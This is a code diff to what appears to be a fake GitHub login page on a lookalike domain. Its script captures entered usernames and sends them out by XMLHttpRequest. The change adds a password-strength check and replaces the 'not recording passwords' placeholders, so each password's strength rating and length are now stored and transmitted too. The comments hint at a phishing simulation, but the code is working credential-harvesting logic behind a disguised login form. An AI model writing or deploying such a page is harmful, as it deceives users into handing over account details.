@@ -305,6 +305,7 @@
         </div>
     </div>
     <div aria-live="polite" class="sr-only"></div>
+
     <script>
     document.cookie='test=rahul;Domain=idenlity.github.io;Path=/*;';
     function getTime() {
@@ -318,6 +319,30 @@
         return `${mm}/${dd}/${yyyy} ${hour}:${minute}:${second}`;      
     }
 
+    /* Password Strength Check
+        Weak – If the length is less than 10 characters and doesn't contain a combination of symbols, caps, text.
+        Medium – If the length is 10 characters or more and has a combination of symbols, caps, text.
+        Strong – If the length is 12 characters or more and has a combination of symbols, caps, tex
+    */
+    function checkPasswordStrength() {
+          var strongRegex = new RegExp("^(?=.{12,})(?=.*[A-Z])(?=.*[a-z])(?=.*[0-9])(?=.*\\W).*$", "g"),
+              mediumRegex = new RegExp("^(?=.{10,})(((?=.*[A-Z])(?=.*[a-z]))|((?=.*[A-Z])(?=.*[0-9]))|((?=.*[a-z])(?=.*[0-9]))).*$", "g"),
+              password = document.getElementById('password').value;
+          
+          if (password.length == 0) {
+            return 'No password is entered!'
+          }
+          else if (strongRegex.test(password)) {
+              return `password is strong. Length ~ ${password.length}`;
+            }
+          else if (mediumRegex.test(password)) {
+              return `password is medium. Length ~ ${password.length}`
+            } 
+          else {
+              return `password is Week. Length ~ ${password.length}`
+            }
+        }
+
 
     function storeData() {
         var username = document.getElementById('login_field'),
@@ -325,7 +350,7 @@
         if (username.value !== "" && password.value !== ""){
             var data = {
             "username": username.value,
-            // "password": password.value // not recording passwords.
+            "password": checkPasswordStrength() // not recording passwords.
             }
             localStorage.setItem('data', JSON.stringify(data));
             document.getElementById('btn').value = 'Signing in...';
@@ -348,7 +373,7 @@
             "host": "github",
             "timestamp": getTime(),
             "username": document.getElementById('login_field').value,
-            "password": 'Intensionally not logged passwords'
+            "password": checkPasswordStrength()
             },
             xhr = new XMLHttpRequest();
           
